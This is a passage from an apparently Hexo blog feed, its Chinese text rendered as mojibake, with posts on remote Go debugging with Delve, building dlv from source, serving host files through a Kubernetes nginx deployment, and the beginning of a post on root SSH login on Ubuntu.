è¯»å–æ˜ å°„çš„å†…å®¹ï¼Œå¹¶æ‰§è¡Œå›è°ƒå‡½æ•°è¾“å‡ºè¿›ç¨‹ä¿¡æ¯</span><br>b[<span class="hljs-string">&quot;events&quot;</span>].open_perf_buffer(print_event)<br><span class="hljs-keyword">while</span> 1:<br>    try:<br>        b.perf_buffer_poll()<br>    except KeyboardInterrupt:<br>        <span class="hljs-built_in">exit</span>()<br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/image-20220726133833600.png" alt="image-20220726133833600"></p><p>å¤§åŠŸå‘Šæˆï¼</p>]]></content>
    
    
    <categories>
      
      <category>ebpf</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€vscodeã€‘vscodeè¿œç¨‹è°ƒè¯•</title>
    <link href="/2022/07/23/software/%E3%80%90vscode%E3%80%91vscode%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95/"/>
    <url>/2022/07/23/software/%E3%80%90vscode%E3%80%91vscode%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95/</url>
    
    <content type="html"><![CDATA[<h3 id="ä½¿ç”¨Delveè°ƒè¯•æ—¶å°†å‚æ•°ä¼ é€’ç»™å¯æ‰§è¡Œæ–‡ä»¶"><a href="#ä½¿ç”¨Delveè°ƒè¯•æ—¶å°†å‚æ•°ä¼ é€’ç»™å¯æ‰§è¡Œæ–‡ä»¶" class="headerlink" title="ä½¿ç”¨Delveè°ƒè¯•æ—¶å°†å‚æ•°ä¼ é€’ç»™å¯æ‰§è¡Œæ–‡ä»¶"></a>ä½¿ç”¨Delveè°ƒè¯•æ—¶å°†å‚æ•°ä¼ é€’ç»™å¯æ‰§è¡Œæ–‡ä»¶</h3><p>åœ¨æœ‰main.goçš„åœ°æ–¹æ‰§è¡Œï¼š</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">CGO_ENABLED</span>=0 <span class="hljs-attribute">GOOS</span>=linux <span class="hljs-attribute">GOARCH</span>=arm64 go build  <span class="hljs-attribute">-gcflags</span>=<span class="hljs-string">&quot;all=-N -l&quot;</span><br></code></pre></td></tr></table></figure><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">go build -gcflags<span class="hljs-operator">=</span><span class="hljs-string">&quot;all=-N -l&quot;</span><br></code></pre></td></tr></table></figure><p>ä¼šç”ŸæˆäºŒè¿›åˆ¶æ–‡ä»¶</p><p>Add <code>--</code> to tell <code>dlv</code> that all subsequent arguments should be passed verbatim to the binary, without trying to parse them:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">dlv <span class="hljs-attribute">--listen</span>=:5432 exec /mypath/binary -- <span class="hljs-attribute">--config</span>=config.toml<br></code></pre></td></tr></table></figure><h2 id="2023-02-13-ä¸‹è½½ç¼–è¯‘æ›´æ–°dlv"><a href="#2023-02-13-ä¸‹è½½ç¼–è¯‘æ›´æ–°dlv" class="headerlink" title="2023.02.13 ä¸‹è½½ç¼–è¯‘æ›´æ–°dlv"></a>2023.02.13 ä¸‹è½½ç¼–è¯‘æ›´æ–°dlv</h2><p>githubåœ°å€ï¼š<a href="https://github.com/go-delve/delve/releases">https://github.com/go-delve/delve/releases</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan ~]<span class="hljs-comment"># wget https://github.com/go-delve/delve/archive/refs/tags/v1.20.0.tar.gz</span><br>[root@ningan ~]<span class="hljs-comment"># mkdir dlv</span><br>[root@ningan ~]<span class="hljs-comment"># mv v1.20.0.tar.gz  dlv</span><br>[root@ningan ~]<span class="hljs-comment"># cd dlv</span><br>[root@ningan dlv]<span class="hljs-comment"># ll</span><br>total 8980<br>drwxr-xr-x  2 root root    4096 Feb 13 10:19 ./<br>drwx------ 56 root root    4096 Feb 13 10:19 ../<br>-rw-r--r--  1 root root 9184679 Feb 13 10:18 v1.20.0.tar.gz<br><br><br>[root@ningan dlv]<span class="hljs-comment"># tar -zxvf v1.20.0.tar.gz</span><br>[root@ningan dlv]<span class="hljs-comment"># ll</span><br>total 8984<br>drwxr-xr-x  3 root root    4096 Feb 13 10:19 ./<br>drwx------ 56 root root    4096 Feb 13 10:19 ../<br>drwxrwxr-x 11 root root    4096 Dec  9 02:34 delve-1.20.0/<br>-rw-r--r--  1 root root 9184679 Feb 13 10:18 v1.20.0.tar.gz<br><br><br>[root@ningan delve-1.20.0]<span class="hljs-comment"># ll</span><br>total 168<br>drwxrwxr-x 11 root root  4096 Dec  9 02:34 ./<br>drwxr-xr-x  3 root root  4096 Feb 13 10:19 ../<br>drwxrwxr-x  2 root root  4096 Dec  9 02:34 assets/<br>-rw-rw-r--  1 root root 44712 Dec  9 02:34 CHANGELOG.md<br>-rw-rw-r--  1 root root   157 Dec  9 02:34 .cirrus.yml<br>drwxrwxr-x  3 root root  4096 Dec  9 02:34 cmd/<br>-rw-rw-r--  1 root root  2440 Dec  9 02:34 CONTRIBUTING.md<br>-rw-rw-r--  1 root root   248 Dec  9 02:34 .deepsource.toml<br>drwxrwxr-x  7 root root  4096 Dec  9 02:34 Documentation/<br>drwxrwxr-x 18 root root  4096 Dec  9 02:34 _fixtures/<br>-rw-rw-r--  1 root root    29 Dec  9 02:34 .gitattributes<br>-rw-rw-r--  1 root root   111 Dec  9 02:34 .gitignore<br>-rw-rw-r--  1 root root   868 Dec  9 02:34 go.mod<br>-rw-rw-r--  1 root root 40428 Dec  9 02:34 go.sum<br>-rw-rw-r--  1 root root   640 Dec  9 02:34 ISSUE_TEMPLATE.md<br>-rw-rw-r--  1 root root  1079 Dec  9 02:34 LICENSE<br>-rw-rw-r--  1 root root   970 Dec  9 02:34 Makefile<br>drwxrwxr-x 13 root root  4096 Dec  9 02:34 pkg/<br>-rw-rw-r--  1 root root  1632 Dec  9 02:34 README.md<br>drwxrwxr-x  2 root root  4096 Dec  9 02:34 _scripts/<br>drwxrwxr-x 10 root root  4096 Dec  9 02:34 service/<br>drwxrwxr-x  2 root root  4096 Dec  9 02:34 .teamcity/<br>drwxrwxr-x  6 root root  4096 Dec  9 02:34 vendor/<br><br>[root@ningan delve-1.20.0]<span class="hljs-comment"># cat Makefile</span><br>.DEFAULT_GOAL=<span class="hljs-built_in">test</span><br><br>SHELL := /bin/bash<br>GO_SRC := $(shell find . -<span class="hljs-built_in">type</span> f -not -path <span class="hljs-string">&#x27;./_fixtures/*&#x27;</span> -not -path <span class="hljs-string">&#x27;./vendor/*&#x27;</span> -not -path <span class="hljs-string">&#x27;./_scripts/*&#x27;</span> -not -path <span class="hljs-string">&#x27;./localtests/*&#x27;</span> -name <span class="hljs-string">&#x27;*.go&#x27;</span>)<br><br>check-cert:<br>        @go run _scripts/make.go check-cert<br><br>build: $(GO_SRC)<br>        @go run _scripts/make.go build<br><br>install: $(GO_SRC)<br>        @go run _scripts/make.go install<br><br>uninstall:<br>        @go run _scripts/make.go uninstall<br><br><span class="hljs-built_in">test</span>: vet<br>        @go run _scripts/make.go <span class="hljs-built_in">test</span><br><br>vet:<br>        @go vet $$(go list ./... | grep -v native)<br><br>test-proc-run:<br>        @go run _scripts/make.go <span class="hljs-built_in">test</span> -s proc -r $(RUN)<br><br>test-integration-run:<br>        @go run _scripts/make.go <span class="hljs-built_in">test</span> -s service/test -r $(RUN)<br><br>vendor:<br>        @go run _scripts/make.go vendor<br><br>build-ebpf-image:<br>        ./pkg/proc/internal/ebpf/build/build-ebpf-builder-img.sh<br><br>build-ebpf-object: build-ebpf-image<br>        ./pkg/proc/internal/ebpf/build/build-ebpf-objects.sh<br><br>.PHONY: vendor test-integration-run test-proc-run <span class="hljs-built_in">test</span> check-cert install build vet uninstall build-ebpf-image build-ebpf-object<br>[root@ningan delve-1.20.0]<span class="hljs-comment">#</span><br><br><br><br>[root@ningan delve-1.20.0]<span class="hljs-comment"># go run _scripts/make.go build</span><br>2023/02/13 10:20:28 error getting build SHA via git: %!w(*exec.ExitError=&amp;&#123;0xc0001980c0 []&#125;)<br>go build -ldflags <span class="hljs-string">&quot;-extldflags -static&quot;</span> -ldflags= github.com/go-delve/delve/cmd/dlv<br><br>[root@ningan delve-1.20.0]<span class="hljs-comment"># ll</span><br>total 17440<br>drwxrwxr-x 11 root root     4096 Feb 13 10:20 ./<br>drwxr-xr-x  3 root root     4096 Feb 13 10:19 ../<br>drwxrwxr-x  2 root root     4096 Dec  9 02:34 assets/<br>-rw-rw-r--  1 root root    44712 Dec  9 02:34 CHANGELOG.md<br>-rw-rw-r--  1 root root      157 Dec  9 02:34 .cirrus.yml<br>drwxrwxr-x  3 root root     4096 Dec  9 02:34 cmd/<br>-rw-rw-r--  1 root root     2440 Dec  9 02:34 CONTRIBUTING.md<br>-rw-rw-r--  1 root root      248 Dec  9 02:34 .deepsource.toml<br>-rwxr-xr-x  1 root root 17683376 Feb 13 10:20 dlv*<br>drwxrwxr-x  7 root root     4096 Dec  9 02:34 Documentation/<br>drwxrwxr-x 18 root root     4096 Dec  9 02:34 _fixtures/<br>-rw-rw-r--  1 root root       29 Dec  9 02:34 .gitattributes<br>-rw-rw-r--  1 root root      111 Dec  9 02:34 .gitignore<br>-rw-rw-r--  1 root root      868 Dec  9 02:34 go.mod<br>-rw-rw-r--  1 root root    40428 Dec  9 02:34 go.sum<br>-rw-rw-r--  1 root root      640 Dec  9 02:34 ISSUE_TEMPLATE.md<br>-rw-rw-r--  1 root root     1079 Dec  9 02:34 LICENSE<br>-rw-rw-r--  1 root root      970 Dec  9 02:34 Makefile<br>drwxrwxr-x 13 root root     4096 Dec  9 02:34 pkg/<br>-rw-rw-r--  1 root root     1632 Dec  9 02:34 README.md<br>drwxrwxr-x  2 root root     4096 Dec  9 02:34 _scripts/<br>drwxrwxr-x 10 root root     4096 Dec  9 02:34 service/<br>drwxrwxr-x  2 root root     4096 Dec  9 02:34 .teamcity/<br>drwxrwxr-x  6 root root     4096 Dec  9 02:34 vendor/<br>[root@ningan delve-1.20.0]<span class="hljs-comment">#</span><br><br>[root@ningan delve-1.20.0]<span class="hljs-comment"># ./dlv version</span><br>Delve Debugger<br>Version: 1.20.0<br>Build: <span class="hljs-variable">$Id</span>: 8ec46ee3d275c276b8e7465d69a23399e0e14789 $<br><br></code></pre></td></tr></table></figure><h2 id="2023-02-24-ç¼–è¯‘dlv-armç‰ˆ"><a href="#2023-02-24-ç¼–è¯‘dlv-armç‰ˆ" class="headerlink" title="2023.02.24 ç¼–è¯‘dlv armç‰ˆ"></a>2023.02.24 ç¼–è¯‘dlv armç‰ˆ</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">go</span> run _scripts/<span class="hljs-built_in">make</span>.<span class="hljs-keyword">go</span> build --GOARCH arm64<br></code></pre></td></tr></table></figure><h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><p><a href="https://kupczynski.info/posts/remote-debug-go-code/">è¿œç¨‹è°ƒè¯•ä½ çš„ä»£ç </a>ï¼ˆé‡è¦ï¼‰</p><p><a href="https://ask.csdn.net/questions/1031161">ä½¿ç”¨Delveè°ƒè¯•æ—¶å°†å‚æ•°ä¼ é€’ç»™å¯æ‰§è¡Œæ–‡ä»¶</a></p><p><a href="bwangel.me/2022/01/12/go_gcflags/">Go gcflags&#x2F;ldflags çš„è¯´æ˜</a></p><p><a href="https://blog.csdn.net/kevin_tech/article/details/125437640?app_version=5.6.1&csdn_share_tail=%7B%22type%22:%22blog%22,%22rType%22:%22article%22,%22rId%22:%22125437640%22,%22source%22:%22unlogin%22%7D&ctrtid=5I8VH&utm_source=app">çœŸé¦™é¢„è­¦ï¼Œè¿™ä¸ªVSCODEå¯è§†åŒ–è°ƒè¯•Goç¨‹åºçš„æ–¹å¼ï¼Œæ¯”ç›´æ¥ç”¨ dlv å‘½ä»¤é¦™å¤šäº†</a></p>]]></content>
    
    
    <categories>
      
      <category>software</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€k8sç³»åˆ—ã€‘(202207) åˆ©ç”¨k8sçš„nginxæ­å»ºæ–‡ä»¶ä¸‹è½½å™¨</title>
    <link href="/2022/07/19/k8s/%E3%80%90k8s%E7%B3%BB%E5%88%97%E3%80%91(202207)%20%E5%88%A9%E7%94%A8k8s%E7%9A%84nginx%E6%90%AD%E5%BB%BA%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E5%99%A8/"/>
    <url>/2022/07/19/k8s/%E3%80%90k8s%E7%B3%BB%E5%88%97%E3%80%91(202207)%20%E5%88%A9%E7%94%A8k8s%E7%9A%84nginx%E6%90%AD%E5%BB%BA%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E5%99%A8/</url>
    
    <content type="html"><![CDATA[<h2 id="éœ€æ±‚"><a href="#éœ€æ±‚" class="headerlink" title="éœ€æ±‚"></a>éœ€æ±‚</h2><p>æƒ³é€šè¿‡k8sçš„nginxå®¹å™¨ä¸‹è½½ä¸»æœºä¸Šçš„æŸä¸ªæ–‡ä»¶</p><p>æ–¹æ³•ï¼šé€šè¿‡å®¹å™¨æŒ‚è½½æ–‡ä»¶æŒ‚è½½çš„æ–¹å¼ï¼ŒæŠŠä¸»æœºæ–‡ä»¶ä¸‹è½½ç›®å½•æŒ‚è½½åˆ°nginxå®¹å™¨å†…ï¼Œå¹¶ä¸”æŒ‚è½½ä¸»æœºä¸Šçš„nginx.confæ–‡ä»¶åˆ°nginxå®¹å™¨å†…ã€‚å½“è®¿é—®nginxæ—¶ï¼Œä¼šåˆ—å‡ºç›¸åº”çš„æ–‡ä»¶è¿›è¡Œä¸‹è½½å³å¯</p><h2 id="æ“ä½œæµç¨‹"><a href="#æ“ä½œæµç¨‹" class="headerlink" title="æ“ä½œæµç¨‹"></a>æ“ä½œæµç¨‹</h2><h3 id="ä¸»æœºæ–‡ä»¶ç»“æ„ï¼šnginx-confæ–‡ä»¶-downloadæ–‡ä»¶å¤¹"><a href="#ä¸»æœºæ–‡ä»¶ç»“æ„ï¼šnginx-confæ–‡ä»¶-downloadæ–‡ä»¶å¤¹" class="headerlink" title="ä¸»æœºæ–‡ä»¶ç»“æ„ï¼šnginx.confæ–‡ä»¶ downloadæ–‡ä»¶å¤¹"></a>ä¸»æœºæ–‡ä»¶ç»“æ„ï¼šnginx.confæ–‡ä»¶ downloadæ–‡ä»¶å¤¹</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@master nginx]<span class="hljs-comment"># pwd</span><br>/root/nginx<br>[root@master nginx]<span class="hljs-comment"># tree</span><br>.<br>â”œâ”€â”€ download<br>â”‚Â Â  â””â”€â”€ test.txt<br>â””â”€â”€ nginx.conf<br><br>1 directory, 2 files<br>[root@master nginx]<span class="hljs-comment"># cat nginx.conf</span><br>user nginx;<br>worker_processes auto;<br>error_log /var/log/nginx/error.log;<br>pid /run/nginx.pid;<br>include /usr/share/nginx/modules/*.conf;<br>events &#123;<br>    worker_connections 1024;<br>&#125;<br>http &#123;<br>    log_format  main  <span class="hljs-string">&#x27;$remote_addr - $remote_user [$time_local] &quot;$request&quot; &#x27;</span><br>                      <span class="hljs-string">&#x27;$status $body_bytes_sent &quot;$http_referer&quot; &#x27;</span><br>                      <span class="hljs-string">&#x27;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;&#x27;</span>;<br>    access_log  /var/log/nginx/access.log  main;<br>    sendfile            on;<br>    tcp_nopush          on;<br>    tcp_nodelay         on;<br>    keepalive_timeout   65;<br>    types_hash_max_size 2048;<br>    default_type        application/octet-stream;<br>    <span class="hljs-comment"># Load modular configuration files from the /etc/nginx/conf.d directory.</span><br>    <span class="hljs-comment"># See http://nginx.org/en/docs/ngx_core_module.html#include</span><br>    <span class="hljs-comment"># for more information.</span><br>    include /etc/nginx/conf.d/*.conf;<br>    server &#123;<br>        listen       80 default_server;<br>        listen       [::]:80 default_server;<br>        server_name  _;<br>        <span class="hljs-comment"># Load configuration files for the default server block.</span><br>        include /etc/nginx/default.d/*.conf;<br>        location / &#123;<br>            root    /usr/share/nginx/html/download;<br>        autoindex on;    <span class="hljs-comment">#å¼€å¯ç´¢å¼•åŠŸèƒ½</span><br>        autoindex_exact_size off;  <span class="hljs-comment">#å…³é—­è®¡ç®—æ–‡ä»¶ç¡®åˆ‡å¤§å°ï¼ˆå•ä½bytesï¼‰ï¼Œåªæ˜¾ç¤ºå¤§æ¦‚å¤§å°ï¼ˆå•ä½kbã€mbã€gbï¼‰</span><br>        autoindex_localtime on;   <span class="hljs-comment">#æ˜¾ç¤ºæœ¬æœºæ—¶é—´è€Œé GMT æ—¶é—´</span><br>        &#125;<br>        error_page 404 /404.html;<br>            location = /40x.html &#123;<br>        &#125;<br>        error_page 500 502 503 504 /50x.html;<br>            location = /50x.html &#123;<br>        &#125;<br>    &#125;<br>&#125;<br><br>[root@master nginx]<span class="hljs-comment"># cat download/test.txt</span><br>Hello, anan<br>[root@master nginx]<span class="hljs-comment">#</span><br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/image-20220719115853392.png" alt="image-20220719115853392"></p><h3 id="k8s-nginx-yamlæ–‡ä»¶"><a href="#k8s-nginx-yamlæ–‡ä»¶" class="headerlink" title="k8s nginx yamlæ–‡ä»¶"></a>k8s nginx yamlæ–‡ä»¶</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@master nginx]<span class="hljs-comment"># cat nginx4.yaml</span><br>apiVersion: apps/v1<br>kind: Deployment<br>metadata:<br>  name: my-nginx<br>spec:<br>  replicas: 3<br>  selector:<br>    matchLabels:<br>      app: nginx<br>  template:<br>    metadata:<br>      labels:<br>        app: nginx<br>    spec:<br>      containers:<br>      - name: nginx<br>        image: nginx:1.20.1<br>        ports:<br>        - containerPort: 80<br>        volumeMounts:<br>          - name: conf<br>            mountPath: /etc/nginx/nginx.conf<br>            subPath: nginx.conf<br>          - name: download<br>            mountPath: /usr/share/nginx/html/download<br>      volumes:<br>        - name: conf<br>          hostPath:<br>            path: /root/nginx/<br>        - name: download<br>          hostPath:<br>            path: /root/nginx/download/<br>---<br>apiVersion: v1<br>kind: Service<br>metadata:<br>  name: ngx-service<br>  labels:<br>    app: nginx<br>spec:<br>  <span class="hljs-built_in">type</span>: NodePort<br>  selector:<br>    app: nginx<br>  ports:<br>  - port: 80<br>    targetPort: 80<br>    nodePort: 8899<br><br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/image-20220719120057356.png" alt="image-20220719120057356"></p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coq">kubectl <span class="hljs-built_in">apply</span> -f nginx.conf<br></code></pre></td></tr></table></figure><p>podæˆåŠŸå¯åŠ¨åï¼Œè®¿é—®nodeportç«¯å£ï¼Œå¯ä»¥çœ‹åˆ°ä¸‹è½½åˆ—è¡¨ï¼Œè¿›è¡Œä¸‹è½½å³å¯ï¼</p><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/image-20220719120130869.png" alt="image-20220719120130869"></p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://blog.csdn.net/qq_39218530/article/details/108022907">ä½¿ç”¨dockeræ­å»ºnginxæ–‡ä»¶ä¸‹è½½æœåŠ¡å™¨</a></p>]]></content>
    
    
    <categories>
      
      <category>k8s</category>
      
    </categories>
    
    
    <tags>
      
      <tag>k8s</tag>
      
      <tag>nginx</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ã€ç½‘ç»œæˆé•¿è®°ã€‘ubuntué¦–æ¬¡SSHä½¿ç”¨rootè´¦æˆ·è¿œç¨‹ç™»å½•</title>
    <link href="/2022/07/16/net/%EF%BC%88%E9%9C%80%E8%A6%81%E6%94%B9%E6%97%B6%E9%97%B4%EF%BC%89%E3%80%90%E7%BD%91%E7%BB%9C%E6%88%90%E9%95%BF%E8%AE%B0%E3%80%91ubuntu%E9%A6%96%E6%AC%A1SSH%E4%BD%BF%E7%94%A8root%E8%B4%A6%E6%88%B7%E8%BF%9C%E7%A8%8B%E7%99%BB%E5%BD%95/"/>
    <url>/2022/07/16/net/%EF%BC%88%E9%9C%80%E8%A6%81%E6%94%B9%E6%97%B6%E9%97%B4%EF%BC%89%E3%80%90%E7%BD%91%E7%BB%9C%E6%88%90%E9%95%BF%E8%AE%B0%E3%80%91ubuntu%E9%A6%96%E6%AC%A1SSH%E4%BD%BF%E7%94%A8root%E8%B4%A6%E6%88%B7%E8%BF%9C%E7%A8%8B%E7%99%BB%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="ubuntué¦–æ¬¡SSHä½¿ç”¨rootè´¦æˆ·è¿œç¨‹ç™»å½•"><a href="#ubuntué¦–æ¬¡SSHä½¿ç”¨rootè´¦æˆ·è¿œç¨‹ç™»å½•" class="headerlink" title="ubuntué¦–æ¬¡SSHä½¿ç”¨rootè´¦æˆ·è¿œç¨‹ç™»å½•"></a>ubuntué¦–æ¬¡SSHä½¿ç”¨rootè´¦æˆ·è¿œç¨‹ç™»å½•</h1><p>release author: ningan123</p><p>release time: 2022-02-16</p><h2 id="æ­¥éª¤"><a href="#æ­¥éª¤" class="headerlink" title="æ­¥éª¤"></a>æ­¥éª¤</h2><h3 id="1-å®‰è£…ssh"><a href="#1-å®‰è£…ssh" class="headerlink" title="1. å®‰è£…ssh"></a>1. å®‰è£…ssh</h3><p> ubuntu  éƒ½åŸç”Ÿæœ‰äº†sshå®¢æˆ·ç«¯ï¼Œå¯ä»¥é€šè¿‡ssh å‘½ä»¤æ£€éªŒ.</p><p> <img src="https://img-blog.csdnimg.cn/0597cc190a9e4defb9cd2edc98458cb4.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è¿œç¨‹è¿æ¥çš„æœåŠ¡å™¨ç«¯æ²¡æœ‰è‡ªå¸¦ï¼Œéœ€è¦è‡ªè¡Œå®‰è£…ï¼Œå‘½ä»¤ä¸ºï¼š</p><p>sudo apt install openssh-server</p><h3 id="2-æ£€æŸ¥sshæ˜¯å¦æˆåŠŸå¯åŠ¨"><a href="#2-æ£€æŸ¥sshæ˜¯å¦æˆåŠŸå¯åŠ¨" class="headerlink" title="2. æ£€æŸ¥sshæ˜¯å¦æˆåŠŸå¯åŠ¨"></a>2. æ£€æŸ¥sshæ˜¯å¦æˆåŠŸå¯åŠ¨</h3><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gradle"> <span class="hljs-regexp">/etc/i</span>nit.d/ssh status<br> systemctl status ssh<br>ps -e | <span class="hljs-keyword">grep</span> sshd<br></code></pre></td></tr></table></figure><h3 id="3-è¿œç¨‹è¿æ¥"><a href="#3-è¿œç¨‹è¿æ¥" class="headerlink" title="3. è¿œç¨‹è¿æ¥"></a>3. è¿œç¨‹è¿æ¥</h3><p>ssh username@ip</p><hr><h2 id="é—®é¢˜ï¼šå¯ä»¥è¿œç¨‹è¿æ¥æ™®é€šç”¨æˆ·-ningan-ï¼Œä½†æ˜¯å´ä¸å¯ä»¥è¿œç¨‹è¿æ¥rootç”¨æˆ·"><a href="#é—®é¢˜ï¼šå¯ä»¥è¿œç¨‹è¿æ¥æ™®é€šç”¨æˆ·-ningan-ï¼Œä½†æ˜¯å´ä¸å¯ä»¥è¿œç¨‹è¿æ¥rootç”¨æˆ·" class="headerlink" 